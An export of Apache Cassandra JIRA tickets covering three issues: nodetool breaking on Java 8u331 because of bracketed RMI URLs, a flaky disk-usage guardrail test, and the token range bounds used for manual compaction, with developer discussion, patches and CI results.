 * Image Release: [https://github.com/actions/virtual-environments/releases/tag/ubuntu20%2F20220410.2]
 

For more details see:
 * [https://github.com/apache/incubator-hugegraph/runs/6146493904?check_suite_focus=true];;;","27/Apr/22 07:45;erickramirezau;Thanks for logging this ticket as I've requested in [PR #1586|https://github.com/apache/cassandra/pull/1586], [~jermy] . 🍻;;;","27/Apr/22 07:53;erickramirezau;The URL parser for JNDI providers which includes RMI (used by JMX) has been improved in Oracle Java 8u331 and brackets are only allowed around IPv6 addresses ([JDK-8278972|https://www.oracle.com/java/technologies/javase/8u331-relnotes.html]).

Attempts to run {{nodetool}} with Java 8u331 breaks because the host in the RMI URL is enclosed in square brackets (from [NodeProbe.java|https://github.com/apache/cassandra/blob/cassandra-4.0.3/src/java/org/apache/cassandra/tools/NodeProbe.java#L108] class):
{noformat}
    private static final String fmtUrl = ""service:jmx:rmi:///jndi/rmi://[%s]:%d/jmxrmi"";
{noformat}
Workarounds provided by [fruch|https://community.datastax.com/users/6521/fruch.html] and [penky28|https://community.datastax.com/users/4944/penky28-147901.html] in [https://community.datastax.com/questions/13764/] are:

OPTION 1 - Add the ""legacy"" parsing flag when running {{{}nodetool{}}}, for example:

{noformat}$ nodetool -Dcom.sun.jndi.rmiURLParsing=legacy status{noformat}

OPTION 2 - Specify the hostname with an IPv6 subnet prefix, for example:

{noformat}$ nodetool -h ::FFFF:127.0.0.1 status{noformat};;;","27/Apr/22 08:55;jermy;We have tried the OPTION 2 (using IPv4-mapped IPv6 address), but still got another error:
{code:java}
Exception creating connection to: ::127.0.0.1; nested exception is: java.net.SocketException: Network is unreachable (connect failed)]{code}
It may require starting cassandra server with a listening IPv6 socket. 

For more error details please see:

[https://github.com/apache/incubator-hugegraph/pull/1844#issuecomment-1107799113]

 ;;;","27/Apr/22 09:08;erickramirezau;It looks like you tried with {color:#ff8b00}{{::127.0.0.1}}{color}. Just to be clear, have you tried {color:#ff8b00}{{::FFFF:127.0.0.1}}{color} instead? 🙂;;;","27/Apr/22 10:17;jermy;I have tried {color:#ff8b00}{{::FFFF:127.0.0.1}}{color} instead, and it works fine: https://github.com/apache/incubator-hugegraph/pull/1853;;;","28/Apr/22 10:10;Rishipandey;I am facing the same issue with Cassandra 4 & Java 11. Thanks for both the workaround options as they worked for me. But waiting for the permanent fix.
{code:java}
root@xxxx.xxxx.xxxx.xxxx:~# nodetool status
nodetool: Failed to connect to '127.0.0.1:7199' - URISyntaxException: 'Malformed IPv6 address at index 7: rmi://[127.0.0.1]:7199'. {code}
Cluster configuration:
{code:java}
Cassandra: 4.0.0 
openjdk version ""11.0.15"" 2022-04-19
Ubuntu 18.04.6 LTS{code};;;","28/Apr/22 12:58;Rishipandey;Although There was Java11 on my VM but pinning was still pointing to that Java 8 problematic version. Now the problem is resolved for me with reverting the pinning to *openjdk version ""1.8.0_312""*;;;","29/Apr/22 16:21;brandon.williams;Jermy, you may want to submit a jira for hugegraph with your PR.

I think for this project since we have to make changes to all the branches, we should take the simplest and least invasive approach of adding the legacy -D flag.  I've done that here:

||Branch||CI||
|[3.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17581-3.0]|[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1647/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1647/pipeline]|
|[3.11|https://github.com/driftx/cassandra/tree/CASSANDRA-17581-3.11]|[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1648/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1648/pipeline]|
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17581-4.0]|[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1649/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1649/pipeline]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17581-trunk]|[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1650/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1650/pipeline]|
;;;","29/Apr/22 16:50;brandon.williams;I now see the [PR|https://github.com/apache/cassandra/pull/1586] that removes the brackets.  Unfortunately that is not workable as it breaks ipv6 support: CASSANDRA-7669;;;","02/May/22 06:49;kkierer;Hi, just to let you know, at the moment the [Cassandra 4.0 images on Docker Hub|https://hub.docker.com/_/cassandra] are broken because they already use Java 11.0.15. And as soon as the [Eclipse Temurin images for Java 8u332|https://hub.docker.com/_/eclipse-temurin?tab=tags&page=1&name=8u332] are available Cassandra 3.x will be rebuilt as well which causes this problem.

Maybe it makes sense to suspend Docker image creation for Cassandra 3.x until this is fixed.

*Nodetool on Cassandra 4.0 Docker image stopped working*
{code:java}
docker run -d --name cassandra cassandra:latest
Unable to find image ...
ffd1b7283a1ac0cf77639d69783120e53242ee0bda2b82e197d01cbee2541718 
{code}
{code:java}
docker exec --tty cassandra nodetool status
nodetool: Failed to connect to '127.0.0.1:7199' - URISyntaxException: 'Malformed IPv6 address at index 7: rmi://[127.0.0.1]:7199'.
{code}
*Nodetool on Cassandra 3.x still works as expected*
{code:java}
docker run -d --name cassandra cassandra:3.0.12
Unable to find image ...
4acd560016059f9d2dce9383280ec6143fe1194da5c215639f70e343e180a5c2
{code}
{code:java}
docker exec --tty cassandra nodetool status
Datacenter: datacenter1
=======================
Status=Up/Down
|/ State=Normal/Leaving/Joining/Moving
--  Address     Load       Tokens       Owns (effective)  Host ID                               Rack
UN  172.17.0.3  103.09 KB  256          100.0%            8862efd0-a2bb-4dc5-91eb-f859cb5a30d5  rack1
{code}

Created an issue for the Cassandra docker library to make them aware of it https://github.com/docker-library/cassandra/issues/248;;;","02/May/22 13:56;jermy;[~brandon.williams] Thanks for providing the information.

If the brackets are kept, users need to convert ipv4 to ipv6 format, which is not very friendly. We can find a more reasonable solution that is compatible with ipv4 and ipv6, and also don't break ipv6 support : CASSANDRA-7669;;;","02/May/22 14:16;brandon.williams;bq. If the brackets are kept, users need to convert ipv4 to ipv6

I don't think that is true.  The brackets have been there since CASSANDRA-7669 specifically to allow this to work, and my understanding is the ""legacy"" parsing option reverts things back to the way they were, where both ipv4 and ipv6 worked before with previous JDK versions.  My testing confirms this.;;;","02/May/22 15:03;jermy;I know that the problem with the {color:#de350b}JDK 1.8.0_332{color} can be solved through workarounds provided by [~erickramirezau].

In the new {color:#de350b}JDK 1.8.0_332{color} version environment, as API programming users(not nodetool users), [converting ipv4 to ipv6|https://github.com/apache/incubator-hugegraph/pull/1853/files#diff-8b051732a0e36f4376c7843678a186c11be586c8498487dde7167e1b1d275ad5R309] is actually more friendly than adding -D legacy option. Furthermore it may cause other conflicts if adding {color:#0747a6}-Dcom.sun.jndi.rmiURLParsing=legacy{color} option when starting a user program based on the cassandra client.

If we don't plan to use a workaround solution all the time, an elegant solution is required. My focus is on we can find a more reasonable solution that is compatible with ipv4 and ipv6.;;;","02/May/22 15:12;brandon.williams;bq. If we don't plan to use a workaround solution all the time, an elegant solution is required.

If someone would like to submit a patch for trunk with a more elegant solution, we can look at using that. For all other branches which are bugfix-only, the legacy parsing is the safest option.

;;;","02/May/22 17:40;jermy;I have submitted a more elegant solution that is compatible with ipv4 and ipv6 address, could you please take a review?

https://github.com/apache/cassandra/pull/1586/files;;;","03/May/22 15:13;e.dimitrova;Applicable to both PRs: can we add some tests? ;;;","04/May/22 17:26;brandon.williams;That solution works for me!  I've added a test for both ipv4 and ipv6 hosts [here|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17581] and have rebased Jermy's patch to run against it:

||Branch||CI||
|[3.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17581-3.0]|[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1673/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1673/pipeline]|
|[3.11|https://github.com/driftx/cassandra/tree/CASSANDRA-17581-3.11]|[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1674/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1674/pipeline]|
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17581-4.0]|[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1679/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1679/pipeline]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17581-4.1]|[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1676/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1676/pipeline]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17581-trunk]|[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1678/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1678/pipeline]|;;;","05/May/22 10:23;bereng;There's only one suspicious failure on trunk about an address already being used. It's sthg I've seen in the past but not recently. Still it's probably down to env. +1 assuming you assess the same in terms of CI failures.;;;","05/May/22 11:17;brandon.williams;Committed, thanks everyone!;;;","06/May/22 18:52;jmckenzie;As we drive down towards green for 4.1, might make sense to start doing the Bot Thing now rather than after release.

Either way, ran it for this ticket and looks good. All existing flakes.

[CI Results]
Branch: trunk, build number: 1130
butler url: [https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-trunk/trunk]
jenkins url: [https://ci-cassandra.apache.org/job/Cassandra-trunk/1130/]
JIRA: CASSANDRA-17581
commit url: [https://git-wip-us.apache.org/repos/asf?p=cassandra.git;a=commit;h=61d4cccb0b137422f8cc8e2a294700753c5a6247]
affected paths:
 * CHANGES.txt
 * src/java/org/apache/cassandra/tools/NodeProbe.java

Build Result: UNSTABLE
Passing Tests: 48185
Failing Tests: 13
||Test|Failures|JIRA|
|org.apache.cassandra.db.virtual.GossipInfoTableTest.testSelectAllWithStateTransitions|4 of 141|CASSANDRA-17584?|
|org.apache.cassandra.cql3.KeywordTest.test[keyword PARTITION isReserved false]|2 of 141|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.net.ConnectionTest.testMessageDeliveryOnReconnect-cdc|9 of 141|CASSANDRA-16677?|
|org.apache.cassandra.db.SinglePartitionSliceCommandTest.testPartitionDeletionRowDeletionTie-cdc|5 of 141|CASSANDRA-17463?|
|org.apache.cassandra.db.commitlog.BatchCommitLogTest.testOutOfOrderFlushRecovery[3]-cdc|1 of 141|CASSANDRA-17607?|
|dtest-novnode.write_failures_test.TestMultiDCWriteFailures.test_oversized_mutation|75 of 141|CASSANDRA-17456?|
|org.apache.cassandra.db.SinglePartitionSliceCommandTest.testPartitionDeletionRangeDeletionTie|11 of 141|CASSANDRA-17463?|
|org.apache.cassandra.distributed.upgrade.MixedModeAvailabilityV30Test.testAvailability|3 of 141|CASSANDRA-17307?|
|org.apache.cassandra.cql3.KeywordTest.test[keyword TUPLE isReserved false]|6 of 141|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.cql3.KeywordTest.test[keyword POSITIVE_NAN isReserved false]|2 of 141|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest.write_failures_test.TestMultiDCWriteFailures.test_oversized_mutation|75 of 141|CASSANDRA-17456?|
|dtest-offheap.write_failures_test.TestMultiDCWriteFailures.test_oversized_mutation|75 of 141|CASSANDRA-17456?|;;;","31/May/22 17:31;jeffrey.lam@sjrb.ca;Hey folks, we're on Cassandra 2.2.19 and running into the same issue with nodetool, will this fix be released for 2.2?;;;","31/May/22 17:33;brandon.williams;2.2 became EOL when 4.0 released unfortunately.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Make GuardrailDiskUsageTest deterministic,CASSANDRA-17576,13441234,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,adelapena,e.dimitrova,e.dimitrova,22/Apr/22 21:33,07/Mar/23 11:52,13/Jul/23 08:40,23/Apr/22 19:32,4.1,4.1-alpha1,,,,,Feature/Guardrails,,,,0,,"Jenkins is low on space so we should mock the amount of available disk space when testing the disk usage guardrails as otherwise the tests fail.

The issue was not seen before commit as CircleCI doesn't have storage problems.

[https://ci-cassandra.apache.org/job/Cassandra-trunk/1095/]

Cc [~adelapena] ",,adelapena,e.dimitrova,,,,,,,,,,,,,"smiklosovic closed pull request #1585: CASSANDRA-17576 trunk: Make GuardrailDiskUsageTest deterministic
URL: https://github.com/apache/cassandra/pull/1585


;27/Apr/22 11:23;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17150,,,,,,,,,,,,,,,,,,,,0.0,adelapena,,,,,,,,,,,,,,Code,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Sat Apr 23 19:31:23 UTC 2022,,,,,,,All,,,,"0|z11q9s:",9223372036854775807,,,,e.dimitrova,,,,Low,,5.0,,https://github.com/apache/cassandra/commit/49cc352916f8dad23533b5328638aeb05ac04ea1,,,,,,,,,Test fix,,,,,"23/Apr/22 13:16;adelapena;The problem happens when [{{GuardrailsOptions.validateDataDiskUsageMaxDiskSize}}|https://github.com/apache/cassandra/blob/b3842de5cf1fa1b81872effb4585fbc7e1873d59/src/java/org/apache/cassandra/config/GuardrailsOptions.java#L696-L714] validates the new {{data_disk_usage_max_disk_size}} property to see if there is enough physical size.

I have moved the calculation of the physical disk space to a separate method on {{DiskUsageMonitor}} and added a Byteman rule to the test intercepting calls to that method. That way the test should always operate with a fixed disk size, independently of the testing machine.
||PR||CircleCI||Jenkins||
|[trunk|https://github.com/apache/cassandra/pull/1585]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1500/workflows/ce3a2a25-7099-4f25-9c8d-207998425193] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1500/workflows/42d37dc4-389a-4277-81e7-0d9a5173350a]|[1628|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1628/pipeline]|;;;","23/Apr/22 17:23;e.dimitrova;Thanks for the quick fix, LGTM

Both Jenkins and CIrcleCI look fine to me. Only non-related known failing tests.

CasCriticalSectionTest - CASSANDRA-17453

CASSANDRA-17553 - NPE in RangeTombstoneTest.overlappingRangeTest-compression

 [org.apache.cassandra.net.ConnectionTest.testMessageDeliveryOnReconnect-compression|https://jenkins-cm4.apache.org/job/Cassandra-devbranch-test-compression/jdk=jdk_1.8_latest,label=cassandra,split=6/lastCompletedBuild/testReport/org.apache.cassandra.net/ConnectionTest/testMessageDeliveryOnReconnect_compression/] - also known issue - CASSANDRA-16677

 [org.apache.cassandra.tools.TopPartitionsTest.testServiceTopPartitionsSingleTable-compression|https://jenkins-cm4.apache.org/job/Cassandra-devbranch-test-compression/jdk=jdk_11_latest,label=cassandra,split=6/lastCompletedBuild/testReport/org.apache.cassandra.tools/TopPartitionsTest/testServiceTopPartitionsSingleTable_compression/] - CASSANDRA-17455 

test_oversized_mutation - CASSANDRA-17456

test_noncomposite_static_cf  - CASSANDRA-17451

+1;;;","23/Apr/22 19:31;adelapena;Thanks for the quick review, committed to {{trunk}} as [49cc352916f8dad23533b5328638aeb05ac04ea1|https://github.com/apache/cassandra/commit/49cc352916f8dad23533b5328638aeb05ac04ea1].;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
forceCompactionForTokenRange when using a wrapped range may include sstables not within that range,CASSANDRA-17575,13441229,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,adelapena,dcapwell,dcapwell,22/Apr/22 20:50,06/Oct/22 15:32,13/Jul/23 08:40,12/Aug/22 09:46,3.11.14,4.0.6,4.1,4.1-beta1,5.0,,Local/Compaction,,,,0,,"This was found in CASSANDRA-17537

When you compact the range (32, 31] this should include everything BUT 32, but in the test org.apache.cassandra.db.compaction.LeveledCompactionStrategyTest#testTokenRangeCompaction it found that SSTables with the bounds (32, 32) were getting included in the set of SSTables to compact",,adelapena,dcapwell,e.dimitrova,,,,,,,,,,,,"ekaterinadimitrova2 commented on code in PR #1742:
URL: https://github.com/apache/cassandra/pull/1742#discussion_r940673204


##########
src/java/org/apache/cassandra/service/StorageServiceMBean.java:
##########
@@ -265,8 +265,14 @@ public interface StorageServiceMBean extends NotificationEmitter
     @Deprecated
     public int relocateSSTables(String keyspace, String ... cfnames) throws IOException, ExecutionException, InterruptedException;
     public int relocateSSTables(int jobs, String keyspace, String ... cfnames) throws IOException, ExecutionException, InterruptedException;
+
     /**
-     * Forces major compaction of specified token range in a single keyspace
+     * Forces major compaction of specified token range in a single keyspace.
+     *
+     * @param keyspaceName the name of the keyspace to be compacted
+     * @param startToken the token at which the compaction range starts (inclusive)
+     * @param endToken the token at which compaction range ends (inclusive)
+     * @param tableNames the names of the tables to be compacted

Review Comment:
   Do we want also to add java doc to `forceKeyspaceCompactionForTokenRange` in `NodeProbe`, for completeness?



##########
src/java/org/apache/cassandra/db/compaction/CompactionManager.java:
##########
@@ -812,11 +812,20 @@ protected void runMayThrow()
         return futures;
     }
 
+    /**
+     * Forces a major compaction of specified token ranges of the specified column family.
+     * <p>
+     * The token ranges will be interpreted as closed intervals to match the closed interval defined by the first and
+     * last keys of a sstable, even though the {@link Range} class is suppossed to be half-open by definition.
+     *
+     * @param cfStore The column family store to be compacted.
+     * @param ranges The token ranges to be compacted, interpreted as closed intervals.
+     */
     public void forceCompactionForTokenRange(ColumnFamilyStore cfStore, Collection<Range<Token>> ranges)
     {
         Callable<Collection<AbstractCompactionTask>> taskCreator = () -> {
             Collection<SSTableReader> sstables = sstablesInBounds(cfStore, ranges);
-            if (sstables == null || sstables.isEmpty())
+            if (sstables.isEmpty())

Review Comment:
   This change is unrelated to the patch and my personal preference is to stick to the main patch in older versions



;08/Aug/22 21:29;githubbot;600","adelapena commented on code in PR #1742:
URL: https://github.com/apache/cassandra/pull/1742#discussion_r941353512


##########
src/java/org/apache/cassandra/db/compaction/CompactionManager.java:
##########
@@ -812,11 +812,20 @@ protected void runMayThrow()
         return futures;
     }
 
+    /**
+     * Forces a major compaction of specified token ranges of the specified column family.
+     * <p>
+     * The token ranges will be interpreted as closed intervals to match the closed interval defined by the first and
+     * last keys of a sstable, even though the {@link Range} class is suppossed to be half-open by definition.
+     *
+     * @param cfStore The column family store to be compacted.
+     * @param ranges The token ranges to be compacted, interpreted as closed intervals.
+     */
     public void forceCompactionForTokenRange(ColumnFamilyStore cfStore, Collection<Range<Token>> ranges)
     {
         Callable<Collection<AbstractCompactionTask>> taskCreator = () -> {
             Collection<SSTableReader> sstables = sstablesInBounds(cfStore, ranges);
-            if (sstables == null || sstables.isEmpty())
+            if (sstables.isEmpty())

Review Comment:
   Fine with me. The unneeded null check isn't on trunk nor 4.1, so it will remain on 3.11 and 4.0.



;09/Aug/22 13:39;githubbot;600","adelapena commented on code in PR #1742:
URL: https://github.com/apache/cassandra/pull/1742#discussion_r941353766


##########
src/java/org/apache/cassandra/service/StorageServiceMBean.java:
##########
@@ -265,8 +265,14 @@ public interface StorageServiceMBean extends NotificationEmitter
     @Deprecated
     public int relocateSSTables(String keyspace, String ... cfnames) throws IOException, ExecutionException, InterruptedException;
     public int relocateSSTables(int jobs, String keyspace, String ... cfnames) throws IOException, ExecutionException, InterruptedException;
+
     /**
-     * Forces major compaction of specified token range in a single keyspace
+     * Forces major compaction of specified token range in a single keyspace.
+     *
+     * @param keyspaceName the name of the keyspace to be compacted
+     * @param startToken the token at which the compaction range starts (inclusive)
+     * @param endToken the token at which compaction range ends (inclusive)
+     * @param tableNames the names of the tables to be compacted

Review Comment:
   Makes sense, added.



;09/Aug/22 13:39;githubbot;600","adelapena closed pull request #1742: CASSANDRA-17575 3.11: Fix compaction token range bounds
URL: https://github.com/apache/cassandra/pull/1742


;12/Aug/22 12:09;githubbot;600","adelapena closed pull request #1743: CASSANDRA-17575 4.0: Fix compaction token range bounds
URL: https://github.com/apache/cassandra/pull/1743


;12/Aug/22 12:09;githubbot;600","adelapena closed pull request #1744: CASSANDRA-17575 4.1: Fix compaction token range bounds
URL: https://github.com/apache/cassandra/pull/1744


;12/Aug/22 12:09;githubbot;600","adelapena closed pull request #1745: CASSANDRA-17575 trunk: Fix compaction token range bounds
URL: https://github.com/apache/cassandra/pull/1745


;12/Aug/22 12:09;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,4200,,,0,4200,,,,,,,,,,,,,,,CASSANDRA-10643,,,,,,CASSANDRA-17537,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,adelapena,,,,,,,,,,,,,,Correctness -> API / Semantic Implementation,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Aug 12 09:43:57 UTC 2022,,,,,,,All,,,,"0|z11q8o:",9223372036854775807,,,,e.dimitrova,,,,Normal,,3.10,,https://github.com/apache/cassandra/commit/4e410fc46da5d6759463230ab09a718178dbd4d9,,,,,,,,,{{LeveledCompactionStrategyTest#testTokenRangeCompaction}} should be enough to cover this. The documentation of {{nodetool compact}} and {{StorageServiceMBean.forceKeyspaceCompactionForTokenRange}} should be updated.,,,,,"12/May/22 15:11;e.dimitrova;Hey [~dcapwell] , I am triaging tickets and I am a bit confused here - (32,31] and (32,32) are kind of the same, no?

Did you mean to say 32 was also included during testing?;;;","01/Jun/22 15:02;e.dimitrova;[~dcapwell], I was wondering whether you had the chance to look at this? ;;;","03/Jun/22 19:32;e.dimitrova;Talked to [~dcapwell] about this one yesterday, he will get back to it to clarify the exact issue.;;;","14/Jul/22 17:21;brandon.williams;[~dcapwell] can you clarify what this ticket needs?;;;","20/Jul/22 21:10;dcapwell;sorry never got the time to work on this.

[~brandon.williams] the test linked, if you change to do (32, 31] you see that compaction included a partition it shouldn't have; we include partition 32 even though the range filters out that partition.  This ticket should figure out why we include the wrong partition and attempt to fix it so we stop;;;","21/Jul/22 16:53;adelapena;{quote}if you change to do (32, 31] you see that compaction included a partition it shouldn't have; we include partition 32 even though the range filters out that partition. This ticket should figure out why we include the wrong partition and attempt to fix it so we stop
{quote}
I think that [{{wrappingRange}}|https://github.com/apache/cassandra/blob/cassandra-4.1/test/unit/org/apache/cassandra/db/compaction/LeveledCompactionStrategyTest.java#L503-L511] in that test actually is {{(32, 31]}} without changing it. I understand that [the asserted value|https://github.com/apache/cassandra/blob/cassandra-4.1/test/unit/org/apache/cassandra/db/compaction/LeveledCompactionStrategyTest.java#L520-L521] should be 11 instead of 1, because we don't compact the ten {{[32, 32]}} sstables, but only the the ten {{[31,32]}} and the ten {{[31, 31]}} sstables. So 20 sstables compacted into one single sstable, plus 10 uncompacted sstables, makes 11 sstables. Is that right?

Probably the issue is on [{{CompactionManger#sstablesInBounds}}|https://github.com/apache/cassandra/blob/trunk/src/java/org/apache/cassandra/db/compaction/CompactionManager.java#L991], where it passes token ranges that exclude the start bound to [{{View.sstablesInBounds}}|https://github.com/apache/cassandra/blob/e4e19e33faf9ac7cf27a9779c8083a7f5c5b865a/src/java/org/apache/cassandra/db/lifecycle/View.java#L181-L185], which includes both bounds.

Also, what token range should we use to compact a single token? [Here|https://github.com/apache/cassandra/blob/cassandra-4.1/test/unit/org/apache/cassandra/db/compaction/LeveledCompactionStrategyTest.java#L446-L447] the test uses {{{}(32, 32]{}}}, although for the comment it seems that the intention in the past was to use {{{}(31, 32]){}}}.;;;","22/Jul/22 13:48;adelapena;Ok, it seems that the problem is that {{CompactionManager.sstablesInBounds}} does't correctly use the half-open token intervals to select the sstable closed intervals, [here|https://github.com/apache/cassandra/blob/ab9ab903fa590409251e97fe075e02a64c8aa4f3/src/java/org/apache/cassandra/db/compaction/CompactionManager.java#L982] and [here|https://github.com/apache/cassandra/blob/ab9ab903fa590409251e97fe075e02a64c8aa4f3/src/java/org/apache/cassandra/db/compaction/CompactionManager.java#L991]. That indeed translates the token range {{(32, 31]}} to a selection of {{{}[32, 31]{}}}, which means the entire token range.

Also, the test uses the range {{(32, 32]}} to compact only the sstables containing the token {{{}32{}}}. That incidentally works because the range is somehow translated to {{{}[32, 32]{}}}. However, I think that the meaning of {{(32, 32]}} is that it's a wrapping range that selects all the tokens. So the way of compacting just the token {{32}} should be using the previous token, as in {{{}(31, 32]{}}}. This is suggested by [this comment|https://github.com/apache/cassandra/blob/ab9ab903fa590409251e97fe075e02a64c8aa4f3/test/unit/org/apache/cassandra/db/compaction/LeveledCompactionStrategyTest.java#L446].

Note that currently {{nodetool compact -st 32 -et 32}} compacts only the token {{{}32{}}}. If we fix {{CompactionManager.sstablesInBounds}} to properly interpret the token ranges, that command would change to compact the entire ring, which is dramatically different.

The proposed patch modifies the behaviour of {{CompactionManager.sstablesInBounds}} to properly interpret token ranges. It accordingly changes the expectations of {{LeveledCompactionStrategyTest#testTokenRangeCompaction}}. I have also updated the help of {{nodetool compact}} to document when a token is inclusive or exclusive, similarly to what was done in CASSANDRA-15545. Maybe we should also add a note on {{NEWS.txt}}.
||Patch||CI||
|[3.11 |https://github.com/apache/cassandra/pull/1742/commits/02cbeb2713d9c6c9d98ad9e2e5cce8f92c041a7a]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1948/workflows/65b64c73-adb0-4fb7-bf7d-e3fdce9577f4]|
|[4.0 |https://github.com/apache/cassandra/pull/1743/commits/734644d91fc7d0f00c199d3eed766b984c92e86b]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1947/workflows/8ad79cc7-2656-4afb-917b-9fd890418995] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1947/workflows/e775dd2f-5733-4b1c-8e11-3970daafe7c6]|
|[4.1 |https://github.com/apache/cassandra/pull/1744/commits/a989b594dff18180d912403ffec1474321856227]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1946/workflows/71fc99c5-994d-4133-bf4f-57aa712c6542] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1946/workflows/49d782ac-e162-419b-bd3e-a5f3086d474c]|
|[trunk|https://github.com/apache/cassandra/pull/1745/commits/f34e675a008358bc9156c23e5fbb1fa345a9c138]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1945/workflows/3ae3bcec-301e-440d-a55f-20b99890c57b] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1945/workflows/716c2a1f-8eea-4fb9-9109-278d74e1b276]|

An alternative approach would be just preserving the current behaviour and add documentation about how the token ranges used in manual compaction are interpreted as closed. That would have the problem doing an odd use of the {{Range}} class across the codebase, and been inconsistent with other tools such as repair.;;;","27/Jul/22 12:29;adelapena;As pointed out by [~jjordan] on [the mail list|https://lists.apache.org/list.html?dev@cassandra.apache.org], using closed intervals for token range compactions actually makes sense. The token ranges passed to {{nodetool compact}} would probably come from {{{}sstablemetadata{}}}, which presents the first and last tokens in the sstable. This is a closed interval, matched by {{nodetool compact}} closed intervals.

Also, a common use case is compacting a sstable with a single big partition. Half-open intervals don't allow to compact a single token, whereas closed intervals do allow it.

What it is quite confusing, besides the lack of documentation, is that manual compaction uses {{Range<Token>}} as argument, and the {{Range}} class is half-open by definition (see [here|https://github.com/apache/cassandra/blob/1f067051537618804ca9d0c66b903be74b942b22/src/java/org/apache/cassandra/dht/Range.java#L33] and [here|https://github.com/apache/cassandra/blob/1f067051537618804ca9d0c66b903be74b942b22/src/java/org/apache/cassandra/dht/Range.java#L236-L239]). However, when compacting we interpret those ranges as if they where closed.

We could use the closed interval {{Bounds}} instead of {{Range}} to better represent the intervals, but unfortunately {{Bounds}} are not-wrapping whereas the manual compaction methods support wrapping ranges. Also, even if we moved to {{Bounds}} we would still need to keep the ranges on the JMX methods for backwards compatibility.

So I'm just modifying the help of {{nodetool compact}} and adding some comments on the related methods about how the ranges are interpreted:
||PR||CI||
|[3.11 |https://github.com/apache/cassandra/pull/1742]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1959/workflows/3f391a29-a6b3-4c3a-927f-b33bf8ababf0]|
